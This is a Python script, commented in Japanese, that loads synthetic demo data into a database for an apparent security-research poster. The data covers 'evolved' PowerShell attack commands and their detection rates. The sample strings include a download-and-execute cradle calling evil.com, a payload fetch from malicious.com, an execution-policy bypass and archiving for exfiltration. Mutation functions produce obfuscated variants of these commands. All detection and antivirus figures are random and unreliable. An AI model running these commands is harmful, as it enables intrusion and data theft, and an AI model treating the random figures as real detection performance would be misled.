#!/usr/bin/env python3
"""
テストデータ投入スクリプト
進化的メトリクスのデモ用データを生成
"""
import os
import sys
import psycopg2
from datetime import datetime, timedelta
import random

# DB接続情報
DB_URL = os.getenv('DB_URL', 'postgresql://user:password@localhost:5432/sechack')

# サンプル攻撃コマンド（PowerShellドメイン）
ATTACK_TEMPLATES = [
    "Get-ChildItem -Path C:\\ -Recurse",
    "Invoke-WebRequest -Uri http://malicious.com/payload.ps1",
    "Get-Process | Where-Object {$_.CPU -gt 10}",
    "New-Item -Path C:\\temp\\backdoor.exe",
    "Set-ExecutionPolicy Bypass -Scope Process",
    "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
    "Get-NetAdapter | Select-Object Name, Status",
    "Compress-Archive -Path C:\\sensitive\\ -DestinationPath C:\\exfil.zip",
    "Start-Process powershell -WindowStyle Hidden",
    "Get-WmiObject Win32_UserAccount | Select-Object Name, SID"
]

def generate_evolved_command(parent_cmd, generation):
    """
    親コマンドから進化したコマンドを生成
    """
    mutations = [
        lambda c: c.replace('Get-', 'gci '),
        lambda c: c.replace('Invoke-', 'iex '),
        lambda c: c + ' -ErrorAction SilentlyContinue',
        lambda c: c + ' | Out-Null',
        lambda c: c.replace('http://', 'https://'),
        lambda c: f"Start-Job {{ {c} }}",
        lambda c: f"& {{ {c} }}",
    ]
    
    mutated = parent_cmd
    for _ in range(random.randint(1, min(3, generation))):
        mutation = random.choice(mutations)
        try:
            mutated = mutation(mutated)
        except:
            pass
    
    return mutated

def populate_test_data():
    """
    テストデータをDBに投入
    """
    print("🔄 Connecting to database...")
    conn = psycopg2.connect(DB_URL)
    cursor = conn.cursor()
    
    print("✅ Connected!")
    
    # 開始時刻
    start_time = datetime.now() - timedelta(hours=72)
    
    # ドメイン別データ生成
    domains = {
        'powershell': {
            'known_count': 150,
            'novel_count': 39,
            'max_generation': 6
        },
        'webapp': {
            'known_count': 120,
            'novel_count': 28,
            'max_generation': 5
        },
        'iot': {
            'known_count': 90,
            'novel_count': 22,
            'max_generation': 4
        },
        'cloud': {
            'known_count': 110,
            'novel_count': 31,
            'max_generation': 5
        }
    }
    
    for domain, config in domains.items():
        print(f"\n📊 Generating data for domain: {domain}")
        
        attack_id = 1
        parent_attacks = []
        
        # 第1世代（既知攻撃）
        print(f"  - Generation 1 (Known patterns)...")
        for i in range(config['known_count']):
            cmd = random.choice(ATTACK_TEMPLATES)
            event_id = f"{domain}_{attack_id:04d}"
            timestamp = start_time + timedelta(minutes=i*2)
            
            cursor.execute("""
                INSERT INTO attack_events 
                (event_id, timestamp, command, domain, generation, parent_ids, novelty_score, elapsed_hours)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (event_id) DO NOTHING
            """, (
                event_id,
                timestamp,
                cmd,
                domain,
                1,
                None,
                round(random.uniform(0.1, 0.3), 4),
                round((timestamp - start_time).total_seconds() / 3600, 2)
            ))
            
            # 検知結果（世代1は高確率で検知）
            is_detected = random.random() < 0.85
            cursor.execute("""
                INSERT INTO detection_results
                (event_id, timestamp, is_dangerous, anomaly_score)
                VALUES (%s, %s, %s, %s)
            """, (event_id, timestamp, is_detected, random.uniform(0.6, 0.9)))
            
            # AV検知結果
            detection_count = random.randint(3, 5) if is_detected else random.randint(0, 2)
            cursor.execute("""
                INSERT INTO av_detection_results
                (attack_id, windows_defender, symantec, mcafee, crowdstrike, sentinelone, detection_count, is_zeroday)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
            """, (
                event_id,
                random.random() < 0.8,
                random.random() < 0.7,
                random.random() < 0.7,
                random.random() < 0.9,
                random.random() < 0.8,
                detection_count,
                detection_count == 0
            ))
            
            parent_attacks.append((event_id, cmd))
            attack_id += 1
        
        # 第2世代以降（進化した攻撃）
        current_parents = parent_attacks.copy()
        
        for gen in range(2, config['max_generation'] + 1):
            print(f"  - Generation {gen}...")
            
            # この世代の攻撃数（徐々に減少）
            gen_count = max(5, config['novel_count'] // (gen - 1))
            
            for i in range(gen_count):
                # ランダムに親を選択
                parent_id, parent_cmd = random.choice(current_parents)
                
                # 進化したコマンド生成
                evolved_cmd = generate_evolved_command(parent_cmd, gen)
                event_id = f"{domain}_{attack_id:04d}"
                timestamp = start_time + timedelta(hours=6*(gen-1), minutes=i*10)
                
                cursor.execute("""
                    INSERT INTO attack_events 
                    (event_id, timestamp, command, domain, generation, parent_ids, novelty_score, elapsed_hours)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                    ON CONFLICT (event_id) DO NOTHING
                """, (
                    event_id,
                    timestamp,
                    evolved_cmd,
                    domain,
                    gen,
                    [parent_id],
                    round(random.uniform(0.5, 0.95), 4),
                    round((timestamp - start_time).total_seconds() / 3600, 2)
                ))
                
                # 検知結果（世代が進むほど検知率低下）
                detection_prob = max(0.2, 0.85 - (gen - 1) * 0.15)
                is_detected = random.random() < detection_prob
                
                cursor.execute("""
                    INSERT INTO detection_results
                    (event_id, timestamp, is_dangerous, anomaly_score)
                    VALUES (%s, %s, %s, %s)
                """, (event_id, timestamp, is_detected, random.uniform(0.3, 0.7)))
                
                # AV検知結果（進化するほど検知されにくい）
                if gen >= 4:
                    detection_count = random.randint(0, 1)
                else:
                    detection_count = random.randint(1, 3)
                
                cursor.execute("""
                    INSERT INTO av_detection_results
                    (attack_id, windows_defender, symantec, mcafee, crowdstrike, sentinelone, detection_count, is_zeroday)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                """, (
                    event_id,
                    detection_count >= 1,
                    detection_count >= 2,
                    detection_count >= 3,
                    detection_count >= 4,
                    detection_count >= 5,
                    detection_count,
                    detection_count == 0
                ))
                
                current_parents.append((event_id, evolved_cmd))
                attack_id += 1
        
        # ドメインサマリー更新
        print(f"  - Updating domain summary...")
        cursor.execute("""
            INSERT INTO domain_summary
            (domain, known_patterns_count, novel_patterns_count, generation_rate, 
             avg_novelty_score, zeroday_count, zeroday_rate, max_generation, experiment_duration_hours)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
            ON CONFLICT (domain) DO UPDATE SET
                known_patterns_count = EXCLUDED.known_patterns_count,
                novel_patterns_count = EXCLUDED.novel_patterns_count,
                generation_rate = EXCLUDED.generation_rate,
                avg_novelty_score = EXCLUDED.avg_novelty_score,
                zeroday_count = EXCLUDED.zeroday_count,
                zeroday_rate = EXCLUDED.zeroday_rate,
                max_generation = EXCLUDED.max_generation,
                experiment_duration_hours = EXCLUDED.experiment_duration_hours
        """, (
            domain,
            config['known_count'],
            config['novel_count'],
            round(config['novel_count'] / (config['known_count'] + config['novel_count']), 4),
            round(random.uniform(0.65, 0.85), 4),
            random.randint(15, 30),
            round(random.uniform(0.35, 0.65), 4),
            config['max_generation'],
            72
        ))
    
    conn.commit()
    cursor.close()
    conn.close()
    
    print("\n✅ Test data population completed!")
    print("🌐 Access the poster page at: http://localhost:3000/poster")

if __name__ == '__main__':
    try:
        populate_test_data()
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
